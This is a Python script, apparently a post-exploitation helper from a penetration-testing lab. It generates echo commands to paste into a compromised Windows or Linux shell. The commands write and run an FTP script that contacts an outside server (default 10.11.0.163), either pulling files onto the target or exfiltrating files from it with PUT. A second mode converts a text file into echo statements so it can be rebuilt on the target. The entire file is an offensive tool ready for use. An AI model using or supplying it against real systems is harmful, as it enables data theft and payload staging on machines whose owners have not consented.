#!/usr/bin/env python3
from string import Template

win_ftp_template = """echo open $ip $port > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
$transfer_commands
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt"""
linux_ftp_template = """
echo 'ftp -n -v $ip $port << EOT' > ftp.txt
echo ascii >> ftp.txt
echo user anonymous '' >> ftp.txt
echo prompt >> ftp.txt
echo binary >> ftp.txt
$transfer_commands
echo bye >> ftp.txt
echo EOT >> ftp.txt
/bin/sh ./ftp.txt
"""

DEFAULT_FTP_IP = '10.11.0.163'
DEFAULT_FTP_PORT = 21
DEFAULT_OUTPUT_FILE = 'echo.txt'


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser(
                description="When you have a target's shell, sometimes it can be a nontrivial task to download or "
                            "upload files. "
                            "This tool provides you with a "
                            "generated list of echo commands, that you can easily copy-pasted them into the target's "
                            "shell.")
    parser.add_argument('--ftp-ip',
                        dest='ftp_ip',
                        required=False,
                        default=DEFAULT_FTP_IP,
                        help='IP of the FTP server to connect to')
    parser.add_argument('--ftp-port',
                        dest='ftp_port',
                        required=False,
                        default=DEFAULT_FTP_PORT,
                        help='Port of the FTP server to connect to')
    parser.add_argument('--ftp-get',
                        dest='ftp_get',
                        nargs="+",
                        required=False,
                        help='Generate a number of statements to download files from the FTP server, file names '
                             'separated by space')
    parser.add_argument('--ftp-put',
                        dest='ftp_put',
                        nargs="+",
                        required=False,
                        help='Generate a number of statements to exfiltrate files from the compromised machine to the '
                             'FTP server. You must provide '
                             'absolute paths to the files, separated by space.')
    parser.add_argument('--file',
                        dest='file',
                        required=False,
                        help='A txt file to generate file transfer statements for')
    parser.add_argument('--platform',
                        dest='platform',
                        choices=['win', 'linux'],
                        default='win',
                        required=False,
                        help='A platform to consider while generating FTP transfer statements. Default is win.')
    options = parser.parse_args()
    return options


def convert_to_echo_statements(source_file):
    with open(source_file, 'r', encoding='utf-8') as source:
        source = [line.strip() for line in source.readlines()]
    assert source
    statements = []
    destination_file = 'echo.txt'
    for line in source:
        if line == source[0]:
            statements.append("echo {line} > {destination_file}"
                              .format(line=line, destination_file=destination_file))
        else:
            statements.append("echo {line} >> {destination_file}"
                              .format(line=line, destination_file=destination_file))
    assert statements
    for line in statements:
        print(line)


options = get_arguments()
if options.ftp_get or options.ftp_put:
    ip, port = options.ftp_ip, options.ftp_port
    platform = options.platform
    if platform == 'win':
        t = Template(win_ftp_template)
    else:
        t = Template(linux_ftp_template)
    if options.ftp_get:
        files = options.ftp_get
        getfiles = '\n'.join([f"echo GET {f} >> ftp.txt" for f in files])
        print(t.substitute(ip=ip, port=port, transfer_commands=getfiles))
    elif options.ftp_put:
        files = options.ftp_put
        putfiles = '\n'.join([f"echo PUT {f} >> ftp.txt" for f in files])
        print(t.substitute(ip=ip, port=port, transfer_commands=putfiles))
elif options.file:
    convert_to_echo_statements(source_file=options.file)
